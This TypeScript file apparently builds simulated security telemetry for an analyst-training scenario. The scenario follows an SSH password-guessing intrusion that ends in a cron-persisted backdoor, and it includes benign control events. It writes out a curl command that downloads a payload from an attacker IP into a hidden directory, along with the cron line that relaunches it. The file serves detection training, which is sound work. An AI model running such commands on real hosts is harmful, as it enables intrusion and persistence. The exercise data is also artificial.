/**
 * Events-only half of the ./linuxSshPersistence.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./linuxSshPersistence.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

/** Telemetry half of `buildLinuxSshPersistenceScenario`: the events and the story title, no answer key. */
export function linuxSshPersistenceScenarioEvents() {
  const B = new Date("2026-04-14T21:40:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const host = {
    name: "nix-bkp-01",
    fqdn: "nix-bkp-01.northwind-logistics.io",
    // One address. The perimeter firewall DNATs the published SSH port to this
    // host, so every host-side log (sshd, auditd, Falcon) sees its own private
    // address — the public VIP only exists on the firewall.
    privateIp: "10.40.2.15",
    sshPort: 2202,
    os: "Ubuntu 22.04.4 LTS",
  };

  // Story-specific infrastructure — none of these addresses appear in another storyline.
  const attacker = {
    // Two guessing nodes: one spraying names that do not exist, one working the real account.
    guessA: "176.111.174.26",
    guessB: "92.118.39.73",
    // The address that actually logs in. It appears in NONE of the failure records.
    success: "46.161.27.119",
    payloadHost: "147.45.112.38",
    // The one hosting-provider address the dropped binary keeps opening TLS sessions to.
    checkin: "38.180.62.144",
  };

  // The legitimate nightly backup's object-storage repository (benign control).
  const backupRepo = { domain: "s3.eu-central-003.backblazeb2.com", ip: "149.137.140.21", bucket: "nw-nix-bkp-01" };

  const implantHash = makeSha256("elf_x86_64_static_fontconfig_kworker_2026_04");
  const implantDir = "/home/svc-backup/.cache/.fontconfig";
  const implantPath = `${implantDir}/kworker`;
  const payloadUrl = `http://${attacker.payloadHost}/updates/kworker`;
  // The line the per-user crontab carries; cron runs it through /bin/sh -c every 30 minutes.
  const cronLine = `${implantPath} >/dev/null 2>&1`;

  // EDR↔scenario integration (Phase 4): one incident. Host-primary Linux
  // intrusion → edr_scope "edr". The sshd/auditd and firewall rows are pivot and
  // transport evidence; the Falcon detection on the masqueraded process is the
  // alert-grade row the shift is paged on.
  const INCIDENT = "inc:lsp:1";

  const events: TelemetryEvent[] = [
    // ── 1. BENIGN DISCRIMINATOR — the admin's own SSH session ──────────────────
    {
      id: "lsp_01_admin_ssh",
      ts: T(0),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_login",
      hostname: host.name,
      user_email: "d.okonkwo@northwind-logistics.io",
      user_title: "Linux Systems Administrator",
      src_ip: "82.166.44.9",
      dst_ip: host.privateIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "informational",
      expected_verdict: "fp",
      mitre_technique: "T1078",
      mitre_tactic: "Initial Access",
      description:
        "sshd on nix-bkp-01 logged 'Accepted publickey for d.okonkwo from 82.166.44.9 port 58114' — the corporate VPN egress address.",
      fp_explanation:
        "This is a legitimate admin session and the control case for the auth log. Three things separate it from the login at 22:38: the method is publickey (a key cannot be guessed, so no password campaign can produce this line), the source is the corporate VPN egress rather than a hosting-provider address, and there is not a single failed authentication from 82.166.44.9 anywhere in the log. Alerting on 'SSH login to an internet-exposed host' alone flags this session and is wrong.",
      authentication: { method: "publickey", result: "success" },
      raw: {
        // sshd's own authpriv line — the only record that names the authentication method.
        "data.program_name": "sshd",
        "data.srcip": "82.166.44.9",
        "data.srcport": "58114",
        "data.dstport": "2202",
        "data.dstuser": "d.okonkwo",
        "system.auth.ssh.method": "publickey",
        "system.auth.ssh.event": "Accepted",
      },
    },

    // ── 2. Password guessing — a name that does not exist ──────────────────────
    {
      id: "lsp_02_unknown_user",
      ts: T(31 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_failed",
      hostname: host.name,
      src_ip: attacker.guessA,
      dst_ip: host.privateIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "medium",
      mitre_technique: "T1110.001",
      mitre_tactic: "Credential Access",
      description:
        "auditd on nix-bkp-01 recorded a failed sshd PAM authentication from 176.111.174.26 with acct=\"?\" — the username tried does not exist on the host.",
      authentication: { method: "password", result: "failure" },
      raw: {
        // Linux-PAM writes acct="?" when the user is unknown (PAM_USER_UNKNOWN) — the
        // attempted name is deliberately not recorded. auid/ses are unset: nobody is logged in yet.
        "data.program_name": "sshd",
        "data.srcip": attacker.guessA,
        "data.srcport": "44118",
        "data.dstport": "2202",
        "data.audit.type": "USER_AUTH",
        "data.audit.acct": "?",
        "data.audit.uid": "0",
        "data.audit.auid": "4294967295",
        "data.audit.ses": "4294967295",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.terminal": "ssh",
        "data.audit.op": "PAM:authentication",
        "data.audit.grantors": "?",
        "data.audit.res": "failed",
      },
    },

    // ── 3. Password guessing — the real service account ────────────────────────
    {
      id: "lsp_03_failed_svcbackup",
      ts: T(52 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_failed",
      hostname: host.name,
      src_ip: attacker.guessB,
      dst_ip: host.privateIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "medium",
      mitre_technique: "T1110.001",
      mitre_tactic: "Credential Access",
      description:
        "auditd on nix-bkp-01 recorded a failed sshd PAM authentication for the existing account svc-backup from 92.118.39.73.",
      authentication: { method: "password", result: "failure" },
      raw: {
        "data.program_name": "sshd",
        "data.srcip": attacker.guessB,
        "data.srcport": "39562",
        "data.dstport": "2202",
        "data.audit.type": "USER_AUTH",
        "data.audit.acct": "svc-backup",
        "data.audit.uid": "0",
        "data.audit.auid": "4294967295",
        "data.audit.ses": "4294967295",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.terminal": "ssh",
        "data.audit.op": "PAM:authentication",
        "data.audit.grantors": "?",
        "data.audit.res": "failed",
      },
    },

    // ── 4. The login that worked — sshd's line names the method ────────────────
    {
      id: "lsp_04_accepted_password",
      ts: T(58 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_login",
      hostname: host.name,
      src_ip: attacker.success,
      dst_ip: host.privateIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1078",
      mitre_tactic: "Initial Access",
      description:
        "sshd on nix-bkp-01 logged 'Accepted password for svc-backup from 46.161.27.119 port 41772'.",
      authentication: { method: "password", result: "success" },
      raw: {
        "data.program_name": "sshd",
        "data.srcip": attacker.success,
        "data.srcport": "41772",
        "data.dstport": "2202",
        "data.dstuser": "svc-backup",
        "system.auth.ssh.method": "password",
        "system.auth.ssh.event": "Accepted",
      },
    },

    // ── 5. The same login as auditd records it — the session id later rows carry ─
    {
      id: "lsp_05_session_open",
      ts: T(58 * MIN + 1 * SEC),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_login",
      hostname: host.name,
      src_ip: attacker.success,
      dst_ip: host.privateIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1078",
      mitre_tactic: "Initial Access",
      description:
        "auditd USER_LOGIN on nix-bkp-01: login id=1004 from 46.161.27.119 opened session 41 on /dev/pts/0, res=success.",
      authentication: { method: "password", result: "success" },
      raw: {
        // USER_LOGIN is written when the session OPENS, after pam_loginuid has set the
        // login uid — so auid/ses are populated here and not on the pre-auth USER_AUTH lines.
        "data.program_name": "sshd",
        "data.srcip": attacker.success,
        "data.srcport": "41772",
        "data.dstport": "2202",
        "data.dstuser": "svc-backup",
        "data.audit.type": "USER_LOGIN",
        "data.audit.acct": "svc-backup",
        "data.audit.uid": "0",
        "data.audit.auid": "1004",
        "data.audit.ses": "41",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.terminal": "/dev/pts/0",
        "data.audit.addr": attacker.success,
        "data.audit.op": "login",
        "data.audit.res": "success",
      },
    },

    // ── 6. First command in the session ────────────────────────────────────────
    {
      id: "lsp_06_whoami",
      ts: T(60 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "linux_execve",
      hostname: host.name,
      src_ip: attacker.success,
      severity: "medium",
      mitre_technique: "T1033",
      mitre_tactic: "Discovery",
      description:
        "auditd SYSCALL (execve) on nix-bkp-01: session 41, auid 1004, tty pts0 ran /usr/bin/id from its shell (ppid 1877).",
      process: {
        name: "id",
        pid: 1901,
        path: "/usr/bin/id",
        parent_name: "bash",
        parent_pid: 1877,
        user: "svc-backup",
      },
      raw: {
        "data.audit.type": "SYSCALL",
        "data.audit.arch": "c000003e",
        "data.audit.syscall": "59",
        "data.audit.success": "yes",
        "data.audit.exit": "0",
        "data.audit.ppid": "1877",
        "data.audit.pid": "1901",
        "data.audit.auid": "1004",
        "data.audit.uid": "1004",
        "data.audit.gid": "1004",
        "data.audit.euid": "1004",
        "data.audit.egid": "1004",
        "data.audit.suid": "1004",
        "data.audit.fsuid": "1004",
        "data.audit.tty": "pts0",
        "data.audit.ses": "41",
        "data.audit.comm": "id",
        "data.audit.exe": "/usr/bin/id",
        "data.audit.key": "exec-tracking",
      },
    },

    // ── 7. THE PRIVILEGE BOUNDARY ──────────────────────────────────────────────
    {
      id: "lsp_07_sudo_denied",
      ts: T(61 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "sudo_command",
      hostname: host.name,
      src_ip: attacker.success,
      severity: "medium",
      mitre_technique: "T1033",
      mitre_tactic: "Discovery",
      description:
        "auditd USER_CMD on nix-bkp-01: session 41 (uid 1004) ran `sudo -l` from terminal pts/0, res=failed.",
      process: {
        name: "sudo",
        pid: 1908,
        path: "/usr/bin/sudo",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: "sudo -l",
        user: "svc-backup",
      },
      raw: {
        "data.audit.type": "USER_CMD",
        "data.audit.pid": "1908",
        "data.audit.uid": "1004",
        "data.audit.auid": "1004",
        "data.audit.ses": "41",
        "data.audit.cwd": "/home/svc-backup",
        "data.audit.cmd": "7375646F202D6C",
        "data.audit.terminal": "pts/0",
        "data.audit.exe": "/usr/bin/sudo",
        "data.audit.res": "failed",
      },
    },

    // ── 8. Payload download ────────────────────────────────────────────────────
    {
      id: "lsp_08_payload_download",
      ts: T(64 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.name,
      src_ip: host.privateIp,
      dst_ip: attacker.payloadHost,
      dst_port: 80,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1105",
      mitre_tactic: "Command and Control",
      description:
        "svc-backup ran curl on nix-bkp-01 with parent bash: GET http://147.45.112.38/updates/kworker over plain HTTP, output written to /home/svc-backup/.cache/.fontconfig/kworker.",
      process: {
        name: "curl",
        pid: 1934,
        path: "/usr/bin/curl",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: `curl -fsSL ${payloadUrl} -o ${implantPath}`,
        user: "svc-backup",
        hash: { sha256: makeSha256("usr_bin_curl_ubuntu2204") },
      },
      file: {
        name: "kworker",
        path: implantPath,
        sha256: implantHash,
        size: 2_871_296,
      },
      network: {
        url: payloadUrl,
        method: "GET",
        status: 200,
        bytes_in: 2_871_296,
        bytes_out: 214,
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "curl",
        "crowdstrike.FilePath": "/usr/bin/",
        "crowdstrike.ImageFileName": "/usr/bin/curl",
        "crowdstrike.CommandLine": `curl -fsSL ${payloadUrl} -o ${implantPath}`,
        "crowdstrike.RawProcessId": "1934",
        "crowdstrike.ParentBaseFileName": "bash",
        "crowdstrike.UserName": "svc-backup",
        "crowdstrike.UID": "1004",
        "crowdstrike.GID": "1004",
        "crowdstrike.SHA256HashData": makeSha256("usr_bin_curl_ubuntu2204"),
        "crowdstrike.event_platform": "Lin",
        "crowdstrike.ComputerName": host.name,
      },
    },

    // ── 9. Making it executable ────────────────────────────────────────────────
    {
      id: "lsp_09_chmod",
      ts: T(66 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "file_modify",
      hostname: host.name,
      severity: "medium",
      mitre_technique: "T1564.001",
      mitre_tactic: "Stealth",
      description:
        "auditd PATH (key perm-mod) on nix-bkp-01: /home/svc-backup/.cache/.fontconfig/kworker is now mode 0100755, ouid 1004, ogid 1004.",
      process: {
        name: "chmod",
        pid: 1941,
        path: "/usr/bin/chmod",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: `chmod 755 ${implantPath}`,
        user: "svc-backup",
      },
      file: { name: "kworker", path: implantPath, sha256: implantHash },
      raw: {
        "data.audit.type": "SYSCALL",
        "data.audit.arch": "c000003e",
        "data.audit.syscall": "268",
        "data.audit.success": "yes",
        "data.audit.exit": "0",
        "data.audit.ppid": "1877",
        "data.audit.pid": "1941",
        "data.audit.auid": "1004",
        "data.audit.uid": "1004",
        "data.audit.gid": "1004",
        "data.audit.euid": "1004",
        "data.audit.egid": "1004",
        "data.audit.ses": "41",
        "data.audit.comm": "chmod",
        "data.audit.exe": "/usr/bin/chmod",
        "data.audit.key": "perm-mod",
        "data.audit.file.name": implantPath,
        "data.audit.file.mode": "0100755",
        "data.audit.file.ouid": "1004",
        "data.audit.file.ogid": "1004",
        "data.audit.file.nametype": "NORMAL",
      },
    },

    // ── 10. USER-LEVEL CRON PERSISTENCE ────────────────────────────────────────
    {
      id: "lsp_10_user_crontab",
      ts: T(68 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "linux_cron",
      hostname: host.name,
      severity: "high",
      mitre_technique: "T1053.003",
      mitre_tactic: "Persistence",
      description:
        "auditd PATH (key cron-mod) on nix-bkp-01: /var/spool/cron/crontabs/svc-backup created (objtype=CREATE) at mode 0100600, ouid 1004, ogid 102.",
      process: {
        name: "crontab",
        pid: 1958,
        path: "/usr/bin/crontab",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: "crontab -",
        user: "svc-backup",
      },
      file: {
        name: "svc-backup",
        path: "/var/spool/cron/crontabs/svc-backup",
      },
      raw: {
        // /usr/bin/crontab is setgid crontab(102): egid/sgid/fsgid become 102 while
        // uid/euid stay 1004 — the file it creates is therefore ouid=1004 ogid=102.
        "data.audit.type": "SYSCALL",
        "data.audit.arch": "c000003e",
        "data.audit.syscall": "257",
        "data.audit.success": "yes",
        "data.audit.exit": "4",
        "data.audit.ppid": "1877",
        "data.audit.pid": "1958",
        "data.audit.auid": "1004",
        "data.audit.uid": "1004",
        "data.audit.gid": "1004",
        "data.audit.euid": "1004",
        "data.audit.egid": "102",
        "data.audit.sgid": "102",
        "data.audit.fsgid": "102",
        "data.audit.ses": "41",
        "data.audit.comm": "crontab",
        "data.audit.exe": "/usr/bin/crontab",
        "data.audit.key": "cron-mod",
        "data.audit.file.name": "/var/spool/cron/crontabs/svc-backup",
        "data.audit.file.mode": "0100600",
        "data.audit.file.ouid": "1004",
        "data.audit.file.ogid": "102",
        "data.audit.file.nametype": "CREATE",
      },
    },

    // ── 11. FIRST ALERT — Falcon flags the masqueraded process ─────────────────
    {
      id: "lsp_11_masquerade_detection",
      ts: T(70 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.name,
      src_ip: host.privateIp,
      severity: "high",
      mitre_technique: "T1036.004",
      mitre_tactic: "Stealth",
      is_detection: true, // alert-grade: the first page of the shift — a kernel-thread name running from a hidden home directory
      edr_scope: "edr",   // host-primary Linux intrusion → investigated in the EDR console
      description:
        "Falcon detection (High, Stealth) on nix-bkp-01: process kworker started from /home/svc-backup/.cache/.fontconfig/ as svc-backup, parent bash, no arguments; disposition detect-only.",
      process: {
        name: "kworker",
        pid: 1974,
        path: implantPath,
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: implantPath,
        user: "svc-backup",
        hash: { sha256: implantHash },
      },
      file: { name: "kworker", path: implantPath, sha256: implantHash, size: 2_871_296 },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "kworker",
        "crowdstrike.FilePath": `${implantDir}/`,
        "crowdstrike.ImageFileName": implantPath,
        "crowdstrike.CommandLine": implantPath,
        "crowdstrike.RawProcessId": "1974",
        "crowdstrike.ParentBaseFileName": "bash",
        "crowdstrike.UserName": "svc-backup",
        "crowdstrike.UID": "1004",
        "crowdstrike.GID": "1004",
        "crowdstrike.SHA256HashData": implantHash,
        "crowdstrike.Tactic": "Stealth",
        "threat.tactic.id": "TA0005",
        "crowdstrike.Technique": "Masquerade Task or Service",
        "threat.technique.id": "T1036",
        "threat.technique.subtechnique.id": "T1036.004",
        "crowdstrike.SeverityName": "High",
        "crowdstrike.PatternDispositionValue": "0",
        "crowdstrike.PatternDispositionDescription": "Detection, standard detection.",
        "crowdstrike.event_platform": "Lin",
        "crowdstrike.ComputerName": host.name,
      },
    },

    // ── 12. The flagged process opens an outbound connection ───────────────────
    {
      id: "lsp_12_implant_connect",
      ts: T(70 * MIN + 20 * SEC),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "net_connection",
      hostname: host.name,
      src_ip: host.privateIp,
      src_port: 51734,
      dst_ip: attacker.checkin,
      dst_port: 443,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1071.001",
      mitre_tactic: "Command and Control",
      description:
        "Falcon network event on nix-bkp-01: kworker opened a TCP connection from 10.40.2.15:51734 to 38.180.62.144:443.",
      process: {
        name: "kworker",
        pid: 1974,
        path: implantPath,
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: implantPath,
        user: "svc-backup",
        hash: { sha256: implantHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "NetworkConnectIP4",
        "crowdstrike.ContextBaseFileName": "kworker",
        "crowdstrike.LocalAddressIP4": host.privateIp,
        "crowdstrike.LocalPort": "51734",
        "crowdstrike.RemoteAddressIP4": attacker.checkin,
        "crowdstrike.RemotePort": "443",
        "crowdstrike.Protocol": "6",
        "crowdstrike.ConnectionDirection": "0",
        "crowdstrike.event_platform": "Lin",
        "crowdstrike.ComputerName": host.name,
      },
    },

    // ── 13. The same session at the perimeter ──────────────────────────────────
    {
      id: "lsp_13_checkin_session_1",
      ts: T(70 * MIN + 23 * SEC),
      source: "firewall",
      vendor: "FortiGate",
      event_type: "net_connection",
      hostname: host.name,
      src_ip: host.privateIp,
      src_port: 51734,
      dst_ip: attacker.checkin,
      dst_port: 443,
      protocol: "tcp",
      severity: "medium",
      mitre_technique: "T1071.001",
      mitre_tactic: "Command and Control",
      description:
        "Firewall closed a 3-second session from nix-bkp-01 (10.40.2.15:51734) to 38.180.62.144:443 under the Allow-Outbound-Internet rule — 1,912 bytes sent, 4,388 received.",
      network: { bytes_out: 1_912, bytes_in: 4_388 },
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.logid": "0000000013",
        "data.level": "notice",
        "data.action": "close",
        "data.srcip": host.privateIp,
        "data.srcport": "51734",
        "data.srcintf": "port3",
        "data.dstip": attacker.checkin,
        "data.dstport": "443",
        "data.dstintf": "wan1",
        "data.proto": "6",
        "data.policyid": "42",
        "data.policyname": "Allow-Outbound-Internet",
        "data.service": "HTTPS",
        "data.dstcountry": "Germany",
        "data.sentbyte": 1_912,
        "data.rcvdbyte": 4_388,
        "data.duration": 3,
        "data.vd": "root",
      },
    },

    // ── 14. Five minutes later: the same shape again ───────────────────────────
    {
      id: "lsp_14_checkin_session_2",
      ts: T(75 * MIN + 23 * SEC),
      source: "firewall",
      vendor: "FortiGate",
      event_type: "net_connection",
      hostname: host.name,
      src_ip: host.privateIp,
      src_port: 51790,
      dst_ip: attacker.checkin,
      dst_port: 443,
      protocol: "tcp",
      severity: "medium",
      mitre_technique: "T1071.001",
      mitre_tactic: "Command and Control",
      description:
        "Five minutes later the firewall closed another 3-second session from nix-bkp-01 (10.40.2.15:51790) to 38.180.62.144:443 under the same rule — 1,904 bytes sent, 4,388 received.",
      network: { bytes_out: 1_904, bytes_in: 4_388 },
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.logid": "0000000013",
        "data.level": "notice",
        "data.action": "close",
        "data.srcip": host.privateIp,
        "data.srcport": "51790",
        "data.srcintf": "port3",
        "data.dstip": attacker.checkin,
        "data.dstport": "443",
        "data.dstintf": "wan1",
        "data.proto": "6",
        "data.policyid": "42",
        "data.policyname": "Allow-Outbound-Internet",
        "data.service": "HTTPS",
        "data.dstcountry": "Germany",
        "data.sentbyte": 1_904,
        "data.rcvdbyte": 4_388,
        "data.duration": 3,
        "data.vd": "root",
      },
    },

    // ── 15. The crontab fires — its command line is the persisted entry ────────
    {
      id: "lsp_15_cron_relaunch",
      ts: T(80 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.name,
      src_ip: host.privateIp,
      severity: "medium",
      mitre_technique: "T1053.003",
      mitre_tactic: "Persistence",
      description:
        `cron on nix-bkp-01 started /bin/sh -c '${cronLine}' as svc-backup.`,
      process: {
        name: "sh",
        pid: 2231,
        path: "/usr/bin/dash",
        parent_name: "cron",
        parent_pid: 2229,
        cmdline: `/bin/sh -c ${cronLine}`,
        user: "svc-backup",
        hash: { sha256: makeSha256("usr_bin_dash_ubuntu2204") },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "dash",
        "crowdstrike.FilePath": "/usr/bin/",
        "crowdstrike.ImageFileName": "/usr/bin/dash",
        "crowdstrike.CommandLine": `/bin/sh -c ${cronLine}`,
        "crowdstrike.RawProcessId": "2231",
        "crowdstrike.ParentBaseFileName": "cron",
        "crowdstrike.UserName": "svc-backup",
        "crowdstrike.UID": "1004",
        "crowdstrike.GID": "1004",
        "crowdstrike.SHA256HashData": makeSha256("usr_bin_dash_ubuntu2204"),
        "crowdstrike.event_platform": "Lin",
        "crowdstrike.ComputerName": host.name,
      },
    },

    // ── 16. BENIGN DISCRIMINATOR — the nightly backup job starts ───────────────
    {
      id: "lsp_16_backup_job",
      ts: T(95 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.name,
      src_ip: host.privateIp,
      severity: "informational",
      expected_verdict: "fp",
      description:
        `cron on nix-bkp-01 started /usr/bin/restic as user backup: backup of /srv/data to repository s3:https://${backupRepo.domain}/${backupRepo.bucket}.`,
      fp_explanation:
        "This is the server's intended nightly workload, provisioned by an administrator. Compare it attribute by attribute with kworker: it runs from /usr/bin (not a dot-directory under a home), it runs as the dedicated backup account rather than svc-backup, its cron entry is the root-owned /etc/cron.d/northwind-backup (no per-user crontab was touched), and its command line names the destination it is about to talk to — the company's Backblaze B2 bucket. The firewall session that follows is one long bulk upload to that storage endpoint, not a few kilobytes every five minutes to a bare IP. 'Outbound TLS from a backup server at night' is not a verdict either way; the process, account and destination are.",
      process: {
        name: "restic",
        pid: 2103,
        path: "/usr/bin/restic",
        parent_name: "cron",
        parent_pid: 2101,
        cmdline: `/usr/bin/restic -r s3:https://${backupRepo.domain}/${backupRepo.bucket} backup /srv/data --exclude-caches --quiet`,
        user: "backup",
        hash: { sha256: makeSha256("restic_0_16_4_linux_amd64") },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "restic",
        "crowdstrike.FilePath": "/usr/bin/",
        "crowdstrike.ImageFileName": "/usr/bin/restic",
        "crowdstrike.CommandLine": `/usr/bin/restic -r s3:https://${backupRepo.domain}/${backupRepo.bucket} backup /srv/data --exclude-caches --quiet`,
        "crowdstrike.RawProcessId": "2103",
        "crowdstrike.ParentBaseFileName": "cron",
        "crowdstrike.UserName": "backup",
        "crowdstrike.UID": "34",
        "crowdstrike.GID": "34",
        "crowdstrike.SHA256HashData": makeSha256("restic_0_16_4_linux_amd64"),
        "crowdstrike.event_platform": "Lin",
        "crowdstrike.ComputerName": host.name,
      },
    },

    // ── 17. BENIGN DISCRIMINATOR — the backup's own outbound session ───────────
    {
      id: "lsp_17_backup_upload",
      ts: T(118 * MIN),
      source: "firewall",
      vendor: "FortiGate",
      event_type: "net_connection",
      hostname: host.name,
      src_ip: host.privateIp,
      src_port: 40112,
      dst_ip: backupRepo.ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "informational",
      expected_verdict: "fp",
      description:
        "Firewall closed a 1,380-second session from nix-bkp-01 (10.40.2.15:40112) to 149.137.140.21:443 under the Allow-Outbound-Internet rule — 1,874,329,612 bytes sent, 6,912,448 received.",
      fp_explanation:
        "This is restic's upload, not a second channel. It opened as the backup job started, it went to the object-storage endpoint named in restic's own command line (149.137.140.21 is Backblaze B2's EU-central S3 endpoint), and it is a single long bulk transfer. The kworker sessions are the opposite shape: about 1.9 KB out every five minutes, three seconds each, to a hosting-provider address no process on this server is configured to use. Both left through the same catch-all Allow-Outbound-Internet rule, which is why the rule proves nothing on its own.",
      network: { domain: backupRepo.domain, bytes_out: 1_874_329_612, bytes_in: 6_912_448 },
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.logid": "0000000013",
        "data.level": "notice",
        "data.action": "close",
        "data.srcip": host.privateIp,
        "data.srcport": "40112",
        "data.srcintf": "port3",
        "data.dstip": backupRepo.ip,
        "data.dstport": "443",
        "data.dstintf": "wan1",
        "data.proto": "6",
        "data.policyid": "42",
        "data.policyname": "Allow-Outbound-Internet",
        "data.service": "HTTPS",
        "data.dstcountry": "Netherlands",
        "data.sentbyte": 1_874_329_612,
        "data.rcvdbyte": 6_912_448,
        "data.duration": 1_380,
        "data.vd": "root",
      },
    },
  ];

  // Every event belongs to the one incident.
  for (const e of events) e.incident_id = INCIDENT;

  return {
    title: "Exposed SSH → Cron-Persisted Backdoor",
    events, T, MIN, host, attacker, backupRepo, implantHash, implantPath, payloadUrl, cronLine,
  };
}
